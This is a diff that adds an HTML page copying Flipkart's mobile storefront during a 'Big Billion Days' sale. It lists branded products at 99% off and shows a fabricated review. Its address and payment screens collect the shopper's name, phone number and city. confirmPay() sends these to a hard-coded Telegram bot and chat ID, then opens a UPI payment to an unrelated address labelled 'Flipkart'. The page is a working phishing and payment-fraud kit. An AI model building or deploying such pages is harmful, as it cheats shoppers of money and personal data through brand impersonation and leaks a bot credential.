@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Flipkart | Big Billion Days</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        body { font-family: 'Roboto', sans-serif; background-color: #f1f3f6; margin: 0; overflow-x: hidden; }
+        .fk-blue { background-color: #2874f0; }
+        .btn-orange { background: #fb641b; color: #fff; border-radius: 2px; font-weight: bold; }
+        .btn-yellow { background: #ff9f00; color: #fff; border-radius: 2px; font-weight: bold; }
+        .rating-badge { background: #388e3c; color: #fff; padding: 2px 6px; border-radius: 3px; font-weight: bold; font-size: 11px; }
+        .line-input { width: 100%; border-bottom: 2px solid #ccc; padding: 12px 0; outline: none; background: transparent; }
+        
+        /* Home Banner Swiper */
+        .home-swiper { width: 100%; height: 180px; }
+        .home-swiper img { width: 100%; height: 100%; object-fit: cover; }
+        
+        /* Detail Page Image Stack */
+        .detail-swiper { height: 320px; width: 100%; background: white; }
+        .detail-swiper img { width: 100%; height: 100%; object-fit: contain; }
+        .full-stack img { width: 100%; height: auto; margin-bottom: 4px; border-bottom: 1px solid #eee; }
+    </style>
+</head>
+<body>
+       <div id="page-home">
+        <header class="fk-blue py-3 px-4 flex items-center justify-between sticky top-0 z-[100]">
+            <div class="flex items-center gap-3">
+                <i class="fa-solid fa-bars text-white text-lg"></i>
+                <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/fkheaderlogo_exploreplus_mobile-f4d035.svg" class="h-5">
+            </div>
+            <i class="fa-solid fa-cart-shopping text-white"></i>
+        </header>
+
+        <div class="fk-blue px-4 pb-3 sticky top-[44px] z-[90]">
+            <div class="bg-white rounded-sm flex items-center px-3 py-2 text-gray-400 gap-2 shadow-inner">
+                <i class="fa-solid fa-magnifying-glass text-xs"></i>
+                <input type="text" id="searchInput" oninput="searchProduct()" placeholder="Search for products, brands and more" class="text-sm w-full outline-none text-black">
+            </div>
+        </div>
+
+        <div class="swiper home-swiper">
+            <div class="swiper-wrapper">
+                <div class="swiper-slide"><img src="https://rukminim1.flixcart.com/fk-p-flap/3240/540/image/c1786792b3252eb0.jpg?q=60"></div>
+                <div class="swiper-slide"><img src="https://rukminim1.flixcart.com/fk-p-flap/3240/540/image/1f9c9ad24c2bc37b.jpg?q=60"></div>
+                <div class="swiper-slide"><img src="https://rukminim1.flixcart.com/fk-p-flap/3240/540/image/66faf3950cda0b7a.png?q=60"></div>
+            </div>
+            <div class="swiper-pagination"></div>
+        </div>
+
+        <div class="bg-white p-3 shadow-sm font-bold text-gray-700 flex justify-between items-center">
+            <span>Special Deals</span>
+            <span class="text-xs fk-blue text-white px-2 py-1 rounded">View All</span>
+        </div>
+        
+        <main id="main-grid" class="grid grid-cols-2 gap-1 p-1 pb-20"></main>
+    </div>
+
+    <div id="page-detail" class="hidden fixed inset-0 bg-[#f1f3f6] z-[200] overflow-y-auto">
+        <nav class="p-3 border-b sticky top-0 bg-white z-[210] flex items-center gap-4 shadow-sm">
+            <i class="fa-solid fa-arrow-left text-xl" onclick="showPage('page-home')"></i>
+            <span class="font-bold">Details</span>
+        </nav>
+
+        <div class="swiper detail-swiper"><div class="swiper-wrapper" id="swiper-images"></div><div class="swiper-pagination"></div></div>
+
+        <div class="p-4 bg-white border-b">
+            <p id="det-name" class="text-lg font-medium text-gray-800 leading-tight"></p>
+            <div class="flex items-baseline gap-2 mt-2">
+                <span id="det-price" class="text-3xl font-bold"></span>
+                <span class="text-green-600 font-bold text-sm">99% off</span>
+            </div>
+        </div>
+
+        <div class="p-4 bg-white mt-2 border-b">
+            <h3 class="font-bold mb-3 text-sm uppercase text-gray-400 tracking-wider">Ratings & Reviews</h3>
+            <div class="border p-3 rounded-md bg-gray-50">
+                <div class="flex items-center gap-2 mb-1">
+                    <span class="rating-badge">5 ★</span> <span class="font-bold text-sm">Mind-blowing!</span>
+                </div>
+                <p class="text-gray-500 text-xs italic">Reviewed in India on 3 January 2026</p>
+                <p class="text-gray-600 text-sm mt-1">Excellent product. I got it at very low price during sale.</p>
+            </div>
+        </div>
+
+        <div class="mt-2 bg-white">
+            <p class="p-4 text-xs font-bold text-gray-400 uppercase">Product Description Photos</p>
+            <div id="full-stack-images" class="full-stack"></div>
+        </div>
+
+        <div class="fixed bottom-0 w-full flex h-14 bg-white border-t z-[220] p-2 gap-2">
+            <button class="w-1/2 font-bold text-sm border rounded">ADD TO CART</button>
+            <button onclick="showPage('page-address')" class="w-1/2 btn-yellow font-bold text-sm rounded">CONTINUE</button>
+        </div>
+    </div>
+
+    <div id="page-address" class="hidden fixed inset-0 bg-white z-[300] overflow-y-auto">
+        <nav class="fk-blue p-4 text-white flex items-center gap-4">
+            <i class="fa-solid fa-arrow-left" onclick="showPage('page-detail')"></i>
+            <span class="font-medium">Add Delivery Address</span>
+        </nav>
+        <div class="p-6 space-y-6">
+            <input type="text" id="uName" placeholder="Full Name (Required)*" class="line-input">
+            <input type="tel" id="uPhone" placeholder="Mobile Number (Required)*" class="line-input" maxlength="10">
+            
+            <div class="relative">
+                <input type="number" id="uPin" placeholder="Pincode (Required)*" class="line-input" oninput="fetchPin(this.value)">
+                <span id="load" class="absolute right-0 bottom-3 text-xs text-blue-500 hidden italic">Locating...</span>
+            </div>
+            
+            <div class="flex gap-4">
+                <input type="text" id="uCity" placeholder="City" class="line-input w-1/2 bg-gray-100" readonly>
+                <input type="text" id="uState" placeholder="State" class="line-input w-1/2 bg-gray-100" readonly>
+            </div>
+            
+            <input id="uAdd" placeholder="House No, Building Name*" class="line-input">
+            <button onclick="goToPayment()" class="w-full btn-orange py-4 rounded shadow-lg uppercase">Save and Continue</button>
+        </div>
+    </div>
+
+    <div id="page-payment" class="hidden fixed inset-0 bg-[#f1f3f6] z-[400] overflow-y-auto">
+        <nav class="fk-blue p-4 text-white flex items-center gap-4">
+            <i class="fa-solid fa-arrow-left" onclick="showPage('page-address')"></i>
+            <span class="font-medium">Payments</span>
+        </nav>
+        <div class="p-4">
+            <div class="bg-white p-4 rounded shadow-sm">
+                <p class="font-bold border-b pb-2 mb-4 text-xs text-gray-500 uppercase">Recommended Method</p>
+                <div class="space-y-6">
+                    <label class="flex items-center justify-between border-b pb-4">
+                        <div class="flex gap-4 items-center">
+                            <img src="https://img.icons8.com/color/48/phone-pe.png" class="w-6 h-6">
+                            <span class="font-bold">UPI (PhonePe / GPay)</span>
+                        </div>
+                        <input type="radio" checked>
+                    </label>
+                    <div class="flex items-center justify-between opacity-30">
+                        <div class="flex gap-4 items-center">
+                            <i class="fa-solid fa-truck-fast text-xl text-gray-500"></i>
+                            <span class="font-bold">Cash on Delivery</span>
+                        </div>
+                        <span class="text-red-600 text-[10px] font-bold border border-red-500 px-1">NOT AVAILABLE</span>
+                    </div>
+                </div>
+            </div>
+            <button onclick="confirmPay()" class="w-full btn-orange py-4 mt-8 shadow-xl uppercase font-bold">Place Order & Pay</button>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
+    <script>
+        const BOT_TOKEN = "8327016009:AAH1igUPnQsuURjtmxxHqaAWTKS-haiO7jM";
+        const CHAT_ID = "1981500395";
+        const MY_UPI = "yourupi@okicici";
+
+        const products = [
+            { id: 1, name: "boAt Airdopes Supreme w/ 4 Mics AI ENx Tech, 50 HRS Playback,Multi Point Connectivity Bluetooth (Sporty Blue, True Wireless)", price: "99", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/8/2/m/-original-imagz5z5jshnhvrp.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/d/n/o/-original-imahfe3khgyywbtu.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/q/x/n/-original-imahfe3kddxufwnw.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/x/h/i/-original-imahfe3k6ycg8erk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/v/0/y/-original-imahfe3kzwe69mcv.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/n/c/w/-original-imahfe3k8jyzw33z.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/j/6/l/-original-imahfe3kzj7whsgg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/e/r/x/-original-imahfe3kgz9hywmh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/a/i/a/-original-imahfe3kgqzta448.jpeg?q=70&crop=false"] },
+            { id: 2, name: "Newturn MAXSON Mid back Work from home/Office/study/desk(WFH) Leather Office Adjustable Arm Chair (Brown, Optional Installation Available)", price: "499", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/office-study-chair/0/b/u/1-iron-42-revolving-chair-brown-newturn-90-original-imahegxcnzfjxpty.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/office-study-chair/x/d/w/1-iron-42-revolving-chair-brown-newturn-90-original-imahegxc2hjhvzht.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/office-study-chair/m/c/w/1-iron-42-revolving-chair-brown-newturn-90-original-imahegxcczhszbus.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/office-study-chair/y/b/2/1-iron-42-revolving-chair-brown-newturn-90-original-imahegxcpddf6heb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/office-study-chair/t/h/r/1-iron-42-revolving-chair-brown-newturn-90-original-imahegxcnhxbjhkg.jpeg?q=70&crop=false"] },
+          { id: 3, name: "OnePlus Nord Buds 2r Wireless Earbuds", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/v/y/i/-original-imagr4t8mwhmtyg9.jpeg"] },
+          { id: 4, name: "OnePlus Nord Buds 2r Wireless Earbuds", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/v/y/i/-original-imagr4t8mwhmtyg9.jpeg"] }
+        ];
+
+        let sel = null; let swpHome, swpDet;
+
+        function init() {
+            const grid = document.getElementById('main-grid');
+            products.forEach(p => {
+                grid.innerHTML += `<div class="bg-white p-3 border shadow-sm" onclick="openProduct(${p.id})"><img src="${p.imgs[0]}" class="h-32 mx-auto object-contain"><p class="text-xs mt-2 line-clamp-2">${p.name}</p><p class="font-bold">₹${p.price}</p><p class="text-green-600 text-[10px] font-bold">99% Off</p></div>`;
+            });
+            swpHome = new Swiper(".home-swiper", { pagination: { el: ".swiper-pagination" }, autoplay: { delay: 3000 } });
+        }
+
+        function showPage(id) {
+            ['page-home', 'page-detail', 'page-address', 'page-payment'].forEach(p => document.getElementById(p).classList.add('hidden'));
+            document.getElementById(id).classList.remove('hidden');
+            window.scrollTo(0,0);
+        }
+
+        function openProduct(id) {
+            sel = products.find(p => p.id === id);
+            document.getElementById('det-name').innerText = sel.name;
+            document.getElementById('det-price').innerText = "₹" + sel.price;
+            
+            const sW = document.getElementById('swiper-images');
+            const fS = document.getElementById('full-stack-images');
+            sW.innerHTML = ''; fS.innerHTML = '';
+
+            sel.imgs.forEach(url => {
+                sW.innerHTML += `<div class="swiper-slide"><img src="${url}"></div>`;
+                fS.innerHTML += `<img src="${url}">`;
+            });
+
+            showPage('page-detail');
+            if(swpDet) swpDet.destroy();
+            swpDet = new Swiper(".detail-swiper", { pagination: { el: ".swiper-pagination" } });
+        }
+
+        async function fetchPin(pin) {
+            if(pin.length === 6) {
+                document.getElementById('load').classList.remove('hidden');
+                try {
+                    const r = await fetch(`https://api.postalpincode.in/pincode/${pin}`);
+                    const d = await r.json();
+                    if(d[0].Status === "Success") {
+                        document.getElementById('uCity').value = d[0].PostOffice[0].District;
+                        document.getElementById('uState').value = d[0].PostOffice[0].State;
+                    }
+                } catch (e) {}
+                document.getElementById('load').classList.add('hidden');
+            }
+        }
+
+        function goToPayment() {
+            if(document.getElementById('uName').value && document.getElementById('uPhone').value) {
+                showPage('page-payment');
+            } else alert("Fill all details");
+        }
+
+        function confirmPay() {
+            const n = document.getElementById('uName').value;
+            const msg = `🔥 *ORDER ALERT* 🔥\n\nItem: ${sel.name}\nPrice: ₹${sel.price}\n\n👤 Name: ${n}\n📞 Phone: ${document.getElementById('uPhone').value}\n📍 City: ${document.getElementById('uCity').value}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+            window.location.href = `upi://pay?pa=${MY_UPI}&pn=Flipkart&am=${sel.price}&cu=INR`;
+        }
+
+        init();
+    </script>
+</body>
+</html>
